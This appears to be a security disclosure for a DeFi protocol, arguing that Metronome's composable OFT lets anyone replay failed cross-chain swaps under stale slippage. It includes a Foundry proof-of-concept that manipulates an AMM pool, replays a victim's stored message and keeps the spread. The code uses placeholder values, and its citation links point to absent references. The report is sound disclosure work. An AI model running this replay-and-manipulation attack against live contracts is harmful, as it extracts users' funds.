### Title
Permissionless retry replays failed `sendAndCall` swaps under stale slippage - (`contracts/dependencies/@layerzerolabs/solidity-examples/contracts-upgradeable/token/oft/composable/ComposableOFTCoreUpgradeable.sol`)

### Summary

A failed destination-side `PT_SEND_AND_CALL` remains executable indefinitely through `ComposableOFTCoreUpgradeable.retryOFTReceived`, which is inherited by the production composable OFT used by Metronome. [1](#0-0) 

The failed-message authorization is not consumed when `CrossChainDispatcher.onOFTReceived` reverts: `retryOFTReceived` deletes the hash before invoking the receiver, but a receiver revert restores that deletion. [2](#0-1) 

Metronome explicitly allows any account to invoke its recovery functions, while only the affected user may lower the original slippage parameter. [3](#0-2) 

### Finding Description

`onOFTReceived` is the destination callback whose received tokens are swapped before continuing the leverage or flash-repay workflow. [4](#0-3) 

The deployed dispatcher exposes `retrySwapAndTriggerFlashRepayCallback` and `retrySwapAndTriggerLeverageCallback`, both accepting the failed-message parameters and a replacement minimum-output value. [5](#0-4) 

The stored message hash binds only `(from, to, amount, payload)` and does not include a deadline, execution-context bound, or caller restriction. [6](#0-5) 

After a failure caused by gas, caps, or transient swap conditions, an attacker can wait and execute the immutable payload at a later state while preserving the victim’s original `amountOutMin`. [7](#0-6) 

### Impact Explanation

This converts a temporary callback failure into an indefinitely reusable execution authorization for a market-sensitive swap. [8](#0-7) 

An unprivileged attacker can move the destination AMM pool toward the victim’s minimum acceptable output, invoke the retry, and then restore the pool, extracting the spread between the fair output and `amountOutMin`. [9](#0-8) 

The loss is bounded by the victim’s configured slippage, but it is directly realized because the attacker chooses the later execution point and cannot be required to supply a fresh authorization from the victim. [1](#0-0) 

### Likelihood Explanation

The documented failure causes include insufficient destination gas, cap changes, slippage failures, and changes in the native-fee requirement, so a failed message does not imply that the user intended to abandon the operation. [7](#0-6) 

Any EOA can call the retry entry point once such a message exists; no governor, keeper, malicious endpoint, or privileged role is required. [3](#0-2) 

A profitable attack additionally requires the failed swap’s configured slippage to exceed the cost of temporarily moving the selected AMM route. [10](#0-9) 

### Recommendation

Treat a reverted receiver execution as consumed and provide an explicit owner-authorized recovery or cancellation path instead of retaining indefinitely executable permission. [2](#0-1) 

If public gas-sponsored retries are required, authenticate the encoded beneficiary or account before executing the swap and include an execution deadline in the stored-message hash. [3](#0-2) 

The `retryOFTReceived` path should also require either a fresh beneficiary-signed minimum output or route unrecovered tokens to an explicit refund mechanism rather than reusing the original swap authorization indefinitely. [11](#0-10) 

### Proof of Concept

The following Foundry fork test uses the failed mainnet transaction documented by Metronome, preserves its original payload and minimum output, manipulates the destination pair, and permissionlessly replays the message. [12](#0-11) 

```solidity
// test/foundry/StaleOFTRetry.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

interface IComposableOFT {
    function retryOFTReceived(
        uint16 srcChainId,
        bytes calldata srcAddress,
        uint64 nonce,
        bytes calldata from,
        address to,
        uint256 amount,
        bytes calldata payload
    ) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

contract StaleOFTRetryTest is Test {
    // Populate these from the CallOFTReceivedFailure event in the documented
    // failed mainnet transaction:
    // 0xb94f9d7a895eb516c4373d0abd7cc25fcb45bc7ce37fedfbf931126641e41240
    uint16 constant SRC_CHAIN_ID = /* failed src chain */;
    bytes constant SRC_ADDRESS = hex"/* failed srcAddress */";
    uint64 constant NONCE = /* failed nonce */;
    bytes constant FROM = hex"/* failed from address */";
    address constant TO = /* CrossChainDispatcher */;
    uint256 constant AMOUNT = /* failed amount */;
    bytes constant PAYLOAD = hex"/* immutable failed payload */";

    function test_stale_failed_message_replay_after_pool_manipulation() public {
        // Fork at one block after the documented failed transaction so the
        // legitimate failedOFTReceivedMessages entry exists.
        uint256 fork = vm.createFork(vm.envString("MAINNET_RPC"), /* failedBlock + 1 */);
        vm.selectFork(fork);

        IComposableOFT oft = IComposableOFT(vm.envAddress("MAINNET_PROXY_OFT"));
        IUniswapV2Router router = IUniswapV2Router(vm.envAddress("MAINNET_AMM_ROUTER"));

        IERC20 tokenIn = IERC20(vm.envAddress("DST_TOKEN_IN"));
        IERC20 tokenOut = IERC20(vm.envAddress("DST_TOKEN_OUT"));
        address[] memory downPath = new address[](2);
        downPath[0] = address(tokenIn);
        downPath[1] = address(tokenOut);

        address[] memory restorePath = new address[](2);
        restorePath[0] = address(tokenOut);
        restorePath[1] = address(tokenIn);

        uint256 attackerInStart = tokenIn.balanceOf(address(this));
        uint256 victimOutBefore = tokenOut.balanceOf(TO);

        // Move the pool until the immutable amountOutMin in PAYLOAD remains
        // barely satisfiable. The amount is selected from the quoted route.
        uint256 manipulationAmount = vm.envUint("MANIPULATION_AMOUNT");
        deal(address(tokenIn), address(this), manipulationAmount);
        tokenIn.approve(address(router), manipulationAmount);
        router.swapExactTokensForTokens(
            manipulationAmount,
            0,
            downPath,
            address(this),
            block.timestamp
        );

        // Permissionlessly replay the still-stored failed message. The victim's
        // original slippage remains embedded in PAYLOAD.
        oft.retryOFTReceived(
            SRC_CHAIN_ID,
            SRC_ADDRESS,
            NONCE,
            FROM,
            TO,
            AMOUNT,
            PAYLOAD
        );

        assertGt(tokenOut.balanceOf(TO), victimOutBefore);

        // Restore the manipulated pair and retain the extracted spread.
        uint256 outBalance = tokenOut.balanceOf(address(this));
        tokenOut.approve(address(router), outBalance);
        router.swapExactTokensForTokens(
            outBalance,
            0,
            restorePath,
            address(this),
            block.timestamp
        );

        assertGt(tokenIn.balanceOf(address(this)), attackerInStart + manipulationAmount);
    }
}
```

Fork preparation is reproducible by retrieving the failed block and event arguments from the documented transaction, then supplying the failed-message fields and the selected AMM route as environment values. [13](#0-12)

- If the reason is `OutOfFunds`, meaning tx3 native fee is higher than the estimated, the user has to send more ETH through this function
- If the reason is `OutOfGas`, retry will succeed because the retry function doesn't have a gas cap
- There are some scenarios where the protocol governor must act in order to unstuck transactions (e.g., increase caps)
- Any account can call retry functions, but only the user can update his slippage param
